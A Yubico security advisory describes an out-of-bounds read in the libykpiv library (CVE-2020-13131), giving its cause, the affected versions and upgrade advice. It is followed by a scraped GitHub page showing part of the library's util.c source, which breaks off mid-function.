![](https://www.yubico.com/wp-content/uploads/2023/03/img-zero-trust-nav-3.jpg)Accelerate your Zero Trust Strategy7 best authentication practices to jumpstart your Zero Trust programGet the white papersecurity-advisory
![](https://www.yubico.com/wp-content/uploads/2023/03/img-federal-nav-3.jpg)Federal cybersecurity requirements Guidance for leaders to prepare for the modern cyber threat eraGet the white papersecurity-advisory
Industriesexpand\_more
[Industries overview](https://www.yubico.com/industries/)
Industries

* [High tech](https://www.yubico.com/industries/technology/)
* [Federal government](https://www.yubico.com/industries/federal/)
* [Department of Defense](https://www.yubico.com/industries/us-department-of-defense/)
* [Federal systems integrators](https://www.yubico.com/industries/federal-systems-integrators/)
* [State & local government](https://www.yubico.com/industries/state-local-government/)
* [Education](https://www.yubico.com/industries/education/)
* [Financial services](https://www.yubico.com/industries/finance/)

* [Retail & hospitality](https://www.yubico.com/industries/retail-and-hospitality/)
* [Telecommunications](/industries/telecommunications/)
* [Healthcare](https://www.yubico.com/industries/healthcare/)
* [Pharmaceuticals](https://www.yubico.com/industries/pharmaceuticals/)
* [Cryptocurrency](https://www.yubico.com/industries/cryptocurrency/)
* [Energy & natural resources](https://www.yubico.com/industries/energy-and-natural-resources/)
* [Manufacturing](https://www.yubico.com/industries/manufacturing/)
* [Elections & campaigns](https://www.yubico.com/industries/political-campaigns/)
* [Insurance organizations](https://www.yubico.com/industries/phishing-resistant-mfa-and-passwordless-for-insurance-organizations/)

![](https://www.yubico.com/wp-content/uploads/2023/03/img-mfg-nav.jpg)Manufacturing and supply chain security Authentication best practices for manufacturingGet the white papersecurity-advisory
![](https://www.yubico.com/wp-content/uploads/2023/03/img-phishing-nav.jpg)Phishing-resistant MFA: Fact vs. FictionMeet requirements for phishing-resistant MFA in OMB M-22-09 guidelinesGet the white papersecurity-advisory
![](https://www.yubico.com/wp-content/uploads/2023/03/img-nat-resources-nav.jpg)Secure energy and natural resources from cyber threats Best practices for phishing-resistant MFA to protect infrastructureGet the white papersecurity-advisory
Resourcesexpand\_more
[All resources](/resources/)
Learn

* [Yubico Blog](https://www.yubico.com/blog/)
* [Cybersecurity glossary](https://www.yubico.com/resources/glossary/)
* [Authentication standards](https://www.yubico.com/authentication-standards/)
* [Resource library](https://www.yubico.com/resources/library/)
* [Developer program](https://developers.yubico.com/)
* [Product briefs](https://www.yubico.com/resource_categories/product-briefs/)
* [Solution briefs](https://www.yubico.com/resource_categories/solution-briefs/)
* [Passkeys](https://www.yubico.com/passkeys/)

Best practices

* [Case studies](https://www.yubico.com/resources/reference-customers/)
* [Get a pilot started](https://www.yubico.com/resources/getting-started/)
* [White papers and reports](https://www.yubico.com/resource_categories/white-papers/)
* [Webinars](https://www.yubico.com/resource_categories/webinars/)

![](https://www.yubico.com/wp-content/uploads/2023/03/img-beyondTrust-nav.jpg)BeyondTrust: secured with a subscriptionPrivileged Access Management leader simplifies deploymentSee case studysecurity-advisory
![](https://www.yubico.com/wp-content/uploads/2023/04/DCT-608-Navigation-promotional-image-for-451-webinar-390x216-1.jpg)S&P Global Market Intelligence report: old habits die hardOnly 46% of orgs protect their applications with MFA. How about yours?Read the reportsecurity-advisory
![](https://www.yubico.com/wp-content/uploads/2023/08/img-Ebook-nav.jpg)Considering Passkeys for your Enterprise?Learn how to avoid common passkey pitfallsVisit Passkey Hubsecurity-advisory
Supportexpand\_more
 [Support home](https://support.yubico.com/hc/en-us)
Get started

* [Find the right YubiKey](/quiz/)
* [Set up your YubiKey](/setup/)
* [Downloads](https://www.yubico.com/support/download/)
* [Product documentation](https://docs.yubico.com/)
* [Support articles](https://support.yubico.com/hc/en-us/)

Services

* [Support Services](https://www.yubico.com/support/support-services/)
* [Professional Services](https://www.yubico.com/support/yubico-for-professional-services/)
* [YubiKey as a Service](https://www.yubico.com/products/yubikey-as-a-service/)

Additional resources

* [Works with YubiKey Program](https://www.yubico.com/works-with-yubikey/catalog/?sort=popular)
* [Buying and shipping information](https://www.yubico.com/support/shipping-and-buying-information/)
* [Security advisories](https://www.yubico.com/support/security-advisories/)
* [Help center](https://support.yubico.com/hc/en-us/)

![](https://www.yubico.com/wp-content/uploads/2023/03/img-setup-nav-3.jpg)How to set up your YubiKeyFollow our guided tutorials to start protecting your servicesSet up your YubiKeysecurity-advisory
![](https://www.yubico.com/wp-content/uploads/2023/03/img-find-nav-3.jpg)Find the best YubiKey for your needsTake the guided quiz and see which YubiKeys fit your needsTake the quizsecurity-advisory
![](https://www.yubico.com/wp-content/uploads/2023/03/img-accelerate-nav-3.jpg)Accelerate your YubiKey deploymentTechnical and operational guidance for your YubiKey rolloutProfessional Servicessecurity-advisory
Search![X icon](https://www.yubico.com/wp-content/themes/yubicool/img/icons/close.svg)[Subscribe](/products/yubienterprise-subscription/)[Store](/store/)

* # ****Security advisory YSA-2020-02, YSA-2020-03****

  ## **Security advisory YSA-2020-02, YSA-2020-03 – Out of bounds read in libykpiv**

  Published date: 2020-07-08
  Tracking ID: YSA-2020-02 , YSA-2020-03
  CVE: [CVE-2020-13131](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13131)

  ### Summary

  The libykpiv library, included in the Yubico PIV Tool project and the YubiKey Smart Card Minidriver, does not properly check embedded length fields during device communication. A maliciously-crafted PIV token could possibly misreport the returned length fields during RSA key generation. This could cause host memory to be leaked that may contain sensitive information. Note that RSA key generation is always initiated by the host and cannot directly be triggered by the token.

  ### Affected products

  Yubico products using the libykpiv library with version 2.0.0 and earlier. This includes the Yubico PIV Tool version 2.0.0 and earlier, and the YubiKey Smart Card Minidriver version 4.1.0.172 and earlier.

  ### Customer actions

  The affected library is included in the Yubico PIV Tool and in the YubiKey Smart Card Minidriver. We recommend individuals using these to upgrade Yubico PIV Tool to 2.1.0 and the YubiKey Smart Card Minidriver to 4.1.1.210.

  Due to the open source software status of the libykpiv library, there might be other users of this library. If in doubt, please check the third party dependencies for libykpiv in the products you use.

  Furthermore, [this tool](https://www.yubico.com/genuine/) can be used to test the authenticity of your YubiKey.

  ### Technical details

  The function ykpiv\_util\_generate\_key() has a local stack buffer of size 1024 bytes. It uses this buffer to communicate with the PIV token but does not correctly validate that the returned length fields are valid. As a result, a maliciously-crafted token could possibly misreport a size of up to 65535 bytes. This length is used in a memory copy operation from a local stack buffer into allocated heap memory. As a result, stack memory from an out of bounds read is returned to the caller instead of the expected communication data.

  In Yubico PIV Tool, the tool is the caller and evaluates the returned data as bignums. It then proceeds to use the bignums as the ‘n’ and ‘e’ arguments for the public part of the generated key. As a result, the public key will consist of ASN1-encoded stack memory.

  In YubiKey Smart Card Minidriver, the overread will cause the key generate function to overwrite allocated heap memory with the stack memory. If an attacker has control of where and what heap memory chunks are placed, a crash could be avoided and the leaked stack memory content could potentially be retrieved..

  Included in the GitHub ChangeLog and commit history of this Yubico PIV Tool release are also a few other fixes to lower severity issues related to the embedded length field.

  The issues include a local denial of service ([CVE-2020-13132](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13132)) where the passed in pointer is deallocated instead of the dynamically allocated one inside the function ykpiv\_util\_generate\_key().

  ### Downloads

  The latest release of yubico-piv-tool can be found [here](https://developers.yubico.com/yubico-piv-tool/) under “releases”.

  The latest release of the Smart Card Minidriver can be found [here](https://www.yubico.com/products/services-software/download/smart-card-drivers-tools/).

  ### Aggregate severity rating

  Yubico has rated this issue as Low to Moderate based on maximum security impact. The base CVSS score is [4.3](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:P/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)

  ### Acknowledgments

  On April 29, 2020, Christian Reitter notified Yubico of multiple security issues. We thank Christian Reitter for reporting these issues and working with us under coordinated vulnerability disclosure.

  ### Timeline

  | April 29, 2020 | Christian Reitter reports issue to Yubico |
  | --- | --- |
  | July 8, 2020 | Yubico-piv-tool 2.1.0 is released with fixes for the reported security issues. |
  | July 8, 2020 | Security Advisory is published |

[![Yubico Text Logo](https://www.yubico.com/wp-content/themes/yubicool/img/logos/logo.svg)](https://www.yubico.com)

* [RSS Feed](https://www.yubico.com/feed/)
* [X](https://x.com/Yubico)
* [LinkedIn](https://www.linkedin.com/company/Yubico)
* [Facebook](https://www.facebook.com/Yubikey)
* [Instagram](https://www.instagram.com/Yubico)
* [YouTube](https://www.youtube.com/c/Yubico)
* [GitHub](https://www.github.com/Yubico)

Find

* [Product finder quiz](/quiz/)

Set up

* [Find set-up guides](/setup/)

Buy

* [Buy online](/store)
* [Contact sales](/contact-us/)

Sign up

* [Get Yubico updates](https://www.yubico.com/email-subscription/)

Why Yubico

* [Careers](https://www.yubico.com/careers/)
* [Events](https://www.yubico.com/events/)
* [Press room](https://www.yubico.com/press/)
* [About us](https://www.yubico.com/why-yubico/about-us/)
* [Investors](https://investors.yubico.com)
* [Partner programs](https://www.yubico.com/why-yubico/partners/)

Products

* [YubiKey 5 Series](https://www.yubico.com/products/yubikey-5-overview/)
* [YubiKey 5 FIPS Series](https://www.yubico.com/products/yubikey-fips/)
* [YubiKey Bio Series](https://www.yubico.com/products/yubikey-bio-series/)
* [Security Key Series](https://www.yubico.com/products/security-key/)
* [YubiHSM 2 & YubiHSM 2 FIPS](https://www.yubico.com/products/hardware-security-module/)

* [Yubico Authenticator](https://www.yubico.com/products/yubico-authenticator/)

Solutions

* [Zero Trust](https://www.yubico.com/solutions/zero-trust/)
* [Phishing-resistant MFA](https://www.yubico.com/solutions/multi-factor-authentication/)
* [Passwordless](https://www.yubico.com/solutions/passwordless/)
* [Cyber insurance](https://www.yubico.com/solutions/cyber-insurance/)
* [More solutions](https://www.yubico.com/solutions/)

Industries

* [Industries overview](https://www.yubico.com/industries/)

Resources

* [Yubico blog](https://www.yubico.com/blog/)
* [Resource library](https://www.yubico.com/resources/library/)
* [Cybersecurity glossary](https://www.yubico.com/resources/glossary/)
* [Authentication standards](https://www.yubico.com/authentication-standards/)
* [Developer program](https://developers.yubico.com/)

Support

* [Works with YubiKey](https://www.yubico.com/works-with-yubikey/catalog/?sort=popular/)
* [Help center](https://support.yubico.com/hc/en-us/)
* [Downloads](https://www.yubico.com/support/download/)
* [Product documentation](https://docs.yubico.com/)
* [Support Services](https://www.yubico.com/support-services/)
* [Professional Services](https://www.yubico.com/support/yubico-for-professional-services/)
* [Contact support](https://support.yubico.com/hc/en-us/requests/new/)

EnglishFrançaisDeutsch日本語EspañolSvenska
 Yubico © 2025 All Rights Reserved.

* [Sitemap](/sitemap_index.xml)
* [Cookies](/support/terms-conditions/cookie-notice/)
* [Legal](/support/terms-conditions/)
* [Privacy](/support/terms-conditions/privacy-notice/)
* [Patents](https://www.yubico.com/why-yubico/patents/)
* [Terms of use](/support/terms-conditions/yubico-website-terms-conditions/)
* [Trust](/trust/)



=== Content from github.com_dd2a3b79_20250119_135228.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FYubico%2Fyubico-piv-tool%2Fblob%2Fd5a78951119c94bf232472900be74fdc651eb36e%2Flib%2Futil.c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FYubico%2Fyubico-piv-tool%2Fblob%2Fd5a78951119c94bf232472900be74fdc651eb36e%2Flib%2Futil.c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Yubico%2Fyubico-piv-tool)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Yubico](/Yubico)
/
**[yubico-piv-tool](/Yubico/yubico-piv-tool)**
Public

* [Notifications](/login?return_to=%2FYubico%2Fyubico-piv-tool) You must be signed in to change notification settings
* [Fork
  100](/login?return_to=%2FYubico%2Fyubico-piv-tool)
* [Star
   312](/login?return_to=%2FYubico%2Fyubico-piv-tool)

* [Code](/Yubico/yubico-piv-tool)
* [Issues
  23](/Yubico/yubico-piv-tool/issues)
* [Pull requests
  6](/Yubico/yubico-piv-tool/pulls)
* [Actions](/Yubico/yubico-piv-tool/actions)
* [Security](/Yubico/yubico-piv-tool/security)
* [Insights](/Yubico/yubico-piv-tool/pulse)

Additional navigation options

* [Code](/Yubico/yubico-piv-tool)
* [Issues](/Yubico/yubico-piv-tool/issues)
* [Pull requests](/Yubico/yubico-piv-tool/pulls)
* [Actions](/Yubico/yubico-piv-tool/actions)
* [Security](/Yubico/yubico-piv-tool/security)
* [Insights](/Yubico/yubico-piv-tool/pulse)

## Files

 d5a7895
## Breadcrumbs

1. [yubico-piv-tool](/Yubico/yubico-piv-tool/tree/d5a78951119c94bf232472900be74fdc651eb36e)
2. /[lib](/Yubico/yubico-piv-tool/tree/d5a78951119c94bf232472900be74fdc651eb36e/lib)
/
# util.c

Copy path Blame  Blame
## Latest commit

## History

[History](/Yubico/yubico-piv-tool/commits/d5a78951119c94bf232472900be74fdc651eb36e/lib/util.c)1744 lines (1397 loc) · 51.1 KB d5a7895
## Breadcrumbs

1. [yubico-piv-tool](/Yubico/yubico-piv-tool/tree/d5a78951119c94bf232472900be74fdc651eb36e)
2. /[lib](/Yubico/yubico-piv-tool/tree/d5a78951119c94bf232472900be74fdc651eb36e/lib)
/
# util.c

Top
## File metadata and controls

* Code
* Blame

1744 lines (1397 loc) · 51.1 KB[Raw](https://github.com/Yubico/yubico-piv-tool/raw/d5a78951119c94bf232472900be74fdc651eb36e/lib/util.c)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000 /\* \* Copyright (c) 2014-2016 Yubico AB \* All rights reserved. \* \* Redistribution and use in source and binary forms, with or without \* modification, are permitted provided that the following conditions are \* met: \* \* \* Redistributions of source code must retain the above copyright \* notice, this list of conditions and the following disclaimer. \* \* \* Redistributions in binary form must reproduce the above \* copyright notice, this list of conditions and the following \* disclaimer in the documentation and/or other materials provided \* with the distribution. \* \* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \* "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT \* LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR \* A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT \* OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, \* SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT \* LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, \* DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY \* THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT \* (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE \* OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \* \*/
#include <stdlib.h>#include <string.h>#include <stdio.h>#include <stdint.h>#include <ctype.h>#include <time.h>
#include "internal.h"#include "ykpiv.h"
#define MAX(a,b) (a) > (b) ? (a) : (b)#define MIN(a,b) (a) < (b) ? (a) : (b)
/\* \* Format defined in SP-800-73-4, Appendix A, Table 9 \* \* FASC-N containing S9999F9999F999999F0F1F0000000000300001E encoded in \* 4-bit BCD with 1 bit parity. run through the tools/fasc.pl script to get \* bytes. This CHUID has an expiry of 2030-01-01. \* \* Defined fields: \* - 0x30: FASC-N (hard-coded) \* - 0x34: Card UUID / GUID (settable) \* - 0x35: Exp. Date (hard-coded) \* - 0x3e: Signature (hard-coded, empty) \* - 0xfe: Error Detection Code (hard-coded) \*/const uint8\_t CHUID\_TMPL[] = { 0x30, 0x19, 0xd4, 0xe7, 0x39, 0xda, 0x73, 0x9c, 0xed, 0x39, 0xce, 0x73, 0x9d, 0x83, 0x68, 0x58, 0x21, 0x08, 0x42, 0x10, 0x84, 0x21, 0xc8, 0x42, 0x10, 0xc3, 0xeb, 0x34, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x35, 0x08, 0x32, 0x30, 0x33, 0x30, 0x30, 0x31, 0x30, 0x31, 0x3e, 0x00, 0xfe, 0x00,};#define CHUID\_GUID\_OFFS 29#define TAG\_CHUID\_UUID 0x34
// f0: Card Identifier// - 0xa000000116 == GSC-IS RID// - 0xff == Manufacturer ID (dummy)// - 0x02 == Card type (javaCard)// - next 14 bytes: card IDconst uint8\_t CCC\_TMPL[] = { 0xf0, 0x15, 0xa0, 0x00, 0x00, 0x01, 0x16, 0xff, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf1, 0x01, 0x21, 0xf2, 0x01, 0x21, 0xf3, 0x00, 0xf4, 0x01, 0x00, 0xf5, 0x01, 0x10, 0xf6, 0x00, 0xf7, 0x00, 0xfa, 0x00, 0xfb, 0x00, 0xfc, 0x00, 0xfd, 0x00, 0xfe, 0x00};#define CCC\_ID\_OFFS 9
static ykpiv\_rc \_read\_certificate(ykpiv\_state \*state, uint8\_t slot, uint8\_t \*buf, size\_t \*buf\_len);static ykpiv\_rc \_write\_certificate(ykpiv\_state \*state, uint8\_t slot, uint8\_t \*data, size\_t data\_len, uint8\_t certinfo);
static ykpiv\_rc \_read\_metadata(ykpiv\_state \*state, uint8\_t tag, uint8\_t\* data, size\_t\* pcb\_data);static ykpiv\_rc \_write\_metadata(ykpiv\_state \*state, uint8\_t tag, uint8\_t \*data, size\_t cb\_data);static ykpiv\_rc \_get\_metadata\_item(uint8\_t \*data, size\_t cb\_data, uint8\_t tag, uint8\_t \*\*pp\_item, size\_t \*pcb\_item);static ykpiv\_rc \_set\_metadata\_item(uint8\_t \*data, size\_t \*pcb\_data, size\_t cb\_data\_max, uint8\_t tag, uint8\_t \*p\_item, size\_t cb\_item);
static size\_t \_obj\_size\_max(ykpiv\_state \*state) { return (state && state->model == DEVTYPE\_NEOr3) ? CB\_OBJ\_MAX\_NEO : CB\_OBJ\_MAX;}
/\*\*\* YKPIV Utility API - aggregate functions and slightly nicer interface\*/
ykpiv\_rc ykpiv\_util\_get\_cardid(ykpiv\_state \*state, ykpiv\_cardid \*cardid) { ykpiv\_rc res = YKPIV\_OK; uint8\_t buf[CB\_OBJ\_MAX]; unsigned long len = sizeof(buf); uint8\_t \*p\_temp = NULL; size\_t cb\_temp = 0; uint8\_t tag = 0;
 if (!cardid) return YKPIV\_GENERIC\_ERROR;
 if (YKPIV\_OK != (res = \_ykpiv\_begin\_transaction(state))) return res; if (YKPIV\_OK != (res = \_ykpiv\_ensure\_application\_selected(state))) goto Cleanup;
 if ((res = \_ykpiv\_fetch\_object(state, YKPIV\_OBJ\_CHUID, buf, &len)) == YKPIV\_OK) { p\_temp = buf;
 while (p\_temp < (buf + len)) { tag = \*p\_temp++;
 if (!\_ykpiv\_has\_valid\_length(p\_temp, buf + len - p\_temp)) { res = YKPIV\_SIZE\_ERROR; goto Cleanup; }
 p\_temp += \_ykpiv\_get\_length(p\_temp, &cb\_temp);
 if (tag == TAG\_CHUID\_UUID) { /\* found card uuid \*/ if (cb\_temp < YKPIV\_CARDID\_SIZE || p\_temp + YKPIV\_CARDID\_SIZE > buf + len) { res = YKPIV\_SIZE\_ERROR; goto Cleanup; }
 res = YKPIV\_OK; memcpy(cardid->data, p\_temp, YKPIV\_CARDID\_SIZE); goto Cleanup; }
 p\_temp += cb\_temp; }
 /\* not found, not malformed \*/ res = YKPIV\_GENERIC\_ERROR; }
Cleanup:
 \_ykpiv\_end\_transaction(state); return res;}
ykpiv\_rc ykpiv\_util\_set\_cardid(ykpiv\_state \*state, const ykpiv\_cardid \*cardid) { ykpiv\_rc res = YKPIV\_OK; uint8\_t id[YKPIV\_CARDID\_SIZE]; uint8\_t buf[sizeof(CHUID\_TMPL)]; size\_t len = 0;
 if (!state) return YKPIV\_GENERIC\_ERROR;
 if (!cardid) { if (PRNG\_OK != \_ykpiv\_prng\_generate(id, sizeof(id))) { return YKPIV\_RANDOMNESS\_ERROR; } } else { memcpy(id, cardid->data, sizeof(id)); }
 if (YKPIV\_OK != (res = \_ykpiv\_begin\_transaction(state))) return res; if (YKPIV\_OK != (res = \_ykpiv\_ensure\_application\_selected(state))) goto Cleanup;
 memcpy(buf, CHUID\_TMPL, sizeof(CHUID\_TMPL)); memcpy(buf + CHUID\_GUID\_OFFS, id, sizeof(id)); len = sizeof(CHUID\_TMPL);
 res = \_ykpiv\_save\_object(state, YKPIV\_OBJ\_CHUID, buf, len);
Cleanup:
 \_ykpiv\_end\_transaction(state); return res;}
ykpiv\_rc ykpiv\_util\_get\_cccid(ykpiv\_state \*state, ykpiv\_cccid \*ccc) { ykpiv\_rc res = YKPIV\_OK; uint8\_t buf[CB\_OBJ\_MAX]; unsigned long len = sizeof(buf);
 if (!ccc) return YKPIV\_GENERIC\_ERROR;
 if (YKPIV\_OK != (res = \_ykpiv\_begin\_transaction(state))) return res; if (YKPIV\_OK != (res = \_ykpiv\_ensure\_application\_selected(state))) goto Cleanup;
 res = \_ykpiv\_fetch\_object(state, YKPIV\_OBJ\_CAPABILITY, buf, &len); if (YKPIV\_OK == res) { if (len != sizeof(CCC\_TMPL)) { res = YKPIV\_GENERIC\_ERROR; } else { memcpy(ccc->data, buf + CCC\_ID\_OFFS, YKPIV\_CCCID\_SIZE); } }
Cleanup:
 \_ykpiv\_end\_transaction(state); return res;}
ykpiv\_rc ykpiv\_util\_set\_cccid(ykpiv\_state \*state, const ykpiv\_cccid \*ccc) { ykpiv\_rc res = YKPIV\_OK; uint8\_t id[YKPIV\_CCCID\_SIZE]; uint8\_t buf[sizeof(CCC\_TMPL)]; size\_t len = 0;
 if (!state) return YKPIV\_GENERIC\_ERROR;
 if (!ccc) { if (PRNG\_OK != \_ykpiv\_prng\_generate(id, sizeof(id))) { return YKPIV\_RANDOMNESS\_ERROR; } } else { memcpy(id, ccc->data, sizeof(id)); }
 if (YKPIV\_OK != (res = \_ykpiv\_begin\_transaction(state))) return res; if (YKPIV\_OK != (res = \_ykpiv\_ensure\_application\_selected(state))) goto Cleanup;
 len = sizeof(CCC\_TMPL); memcpy(buf, CCC\_TMPL, len); memcpy(buf + CCC\_ID\_OFFS, id, YKPIV\_CCCID\_SIZE); res = \_ykpiv\_save\_object(state, YKPIV\_OBJ\_CAPABILITY, buf, len);
Cleanup: \_ykpiv\_end\_transaction(state); return res;}
ykpiv\_devmodel ykpiv\_util\_devicemodel(ykpiv\_state \*state) { if (!state || !state->context || (state->context == (SCARDCONTEXT)-1)) { return DEVTYPE\_UNKNOWN; } return state->model;}
ykpiv\_rc ykpiv\_util\_list\_keys(ykpiv\_state \*state, uint8\_t \*key\_count, ykpiv\_key \*\*data, size\_t \*data\_len) { ykpiv\_rc res = YKPIV\_OK; ykpiv\_key \*pKey = NULL; uint8\_t \*pData = NULL; uint8\_t \*pTemp = NULL; size\_t cbData = 0; size\_t offset = 0; uint8\_t buf[CB\_BUF\_MAX]; size\_t cbBuf = 0; size\_t i = 0; size\_t cbRealloc = 0;
 const size\_t CB\_PAGE = 4096;
 const uint8\_t SLOTS[] = { YKPIV\_KEY\_AUTHENTICATION, YKPIV\_KEY\_SIGNATURE, YKPIV\_KEY\_KEYMGM, YKPIV\_KEY\_RETIRED1, YKPIV\_KEY\_RETIRED2, YKPIV\_KEY\_RETIRED3, YKPIV\_KEY\_RETIRED4, YKPIV\_KEY\_RETIRED5, YKPIV\_KEY\_RETIRED6, YKPIV\_KEY\_RETIRED7, YKPIV\_KEY\_RETIRED8, YKPIV\_KEY\_RETIRED9, YKPIV\_KEY\_RETIRED10, YKPIV\_KEY\_RETIRED11, YKPIV\_KEY\_RETIRED12, YKPIV\_KEY\_RETIRED13, YKPIV\_KEY\_RETIRED14, YKPIV\_KEY\_RETIRED15, YKPIV\_KEY\_RETIRED16, YKPIV\_KEY\_RETIRED17, YKPIV\_KEY\_RETIRED18, YKPIV\_KEY\_RETIRED19, YKPIV\_KEY\_RETIRED20, YKPIV\_KEY\_CARDAUTH };
 if ((NULL == data) || (NULL == data\_len) || (NULL == key\_count)) { return YKPIV\_GENERIC\_ERROR; }
 if (YKPIV\_OK != (res = \_ykpiv\_begin\_transaction(state))) return res; if (YKPIV\_OK != (res = \_ykpiv\_ensure\_application\_selected(state))) goto Cleanup;
 // init return parameters \*key\_count = 0; \*data = NULL; \*data\_len = 0;
 // allocate initial page of buffer if (NULL == (pData = \_ykpiv\_alloc(state, CB\_PAGE))) { res = YKPIV\_MEMORY\_ERROR; goto Cleanup; }
 cbData = CB\_PAGE;
 for (i = 0; i < sizeof(SLOTS); i++) { cbBuf = sizeof(buf); res = \_read\_certificate(state, SLOTS[i], buf, &cbBuf);
 if ((res == YKPIV\_OK) && (cbBuf > 0)) { // add current slot to result, grow result buffer if necessary
